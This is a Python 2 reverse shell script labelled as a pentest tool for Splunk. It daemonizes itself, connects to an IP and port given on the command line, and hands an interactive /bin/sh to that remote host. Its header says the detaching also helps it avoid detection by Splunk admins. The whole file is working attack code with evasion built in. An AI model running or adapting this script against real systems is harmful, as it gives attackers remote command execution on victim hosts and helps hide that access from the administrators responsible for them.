#!/usr/bin/env python


#**************************************************************************#
#  Filename: py_rev_shel.py             (Created: 2016-08-18)              #
#                                       (Updated: 2016-10-02)              #
#  Info:                                                                   #
#    TBG Security Python Reverse Shell for pentests.                       #
#       This will fork itself and detach from the parent Splunk process    #
#       so that Splunk does not hang while the reverse shell is running.   #
#       This also helps to avoid detection by Splunk admins.               #
#  Author:                                                                 #
#    Ryan Hays                                                             #
#**************************************************************************#

import os
import socket
import subprocess
import sys


UMASK = 0
WORKDIR = "/"
MAXFD = 1024

if hasattr(os, "devnull"):
    REDIRECT_TO = os.devnull
else:
    REDIRECT_TO = "/dev/null"


def createdaemon():
    try:
        pid = os.fork()
    except OSError, e:
        raise Exception, "%s [%d]" % (e.strerror, e.errno)

    if pid == 0:  # The first child.
        os.setsid()
        try:
            pid = os.fork()  # Fork a second child.
        except OSError, e:
            raise Exception, "%s [%d]" % (e.strerror, e.errno)

        if pid == 0:  # The second child.
            os.chdir(WORKDIR)
            os.umask(UMASK)
        else:
            os._exit(0)  # Exit parent (the first child) of the second child.
    else:
        os._exit(0)  # Exit parent of the first child.

    import resource  # Resource usage information.
    maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
    if maxfd == resource.RLIM_INFINITY:
        maxfd = MAXFD

    for fd in range(0, maxfd):
        try:
            os.close(fd)
        except OSError:  # ERROR, fd wasn't open to begin with (ignored)
            pass
    os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
    os.dup2(0, 1)  # standard output (1)
    os.dup2(0, 2)  # standard error (2)

    return (0)


if __name__ == "__main__":
    retCode = createdaemon()

    procParams = """
   return code = %s
   process ID = %s
   parent process ID = %s
   process group ID = %s
   session ID = %s
   user ID = %s
   effective user ID = %s
   real group ID = %s
   effective group ID = %s
   """ % (retCode, os.getpid(), os.getppid(), os.getpgrp(), os.getsid(0),
          os.getuid(), os.geteuid(), os.getgid(), os.getegid())

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connect_to_ip = sys.argv[1]
    except IndexError:
        sys.exit(1)

    try:
        connect_to_port = int(sys.argv[2])
    except IndexError:
        connect_to_port = 1234

    try:
        s.connect((connect_to_ip, connect_to_port))
    except socket.error:
        sys.exit(1)

    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    p = subprocess.call(["/bin/sh", "-i"])

    sys.exit(retCode)
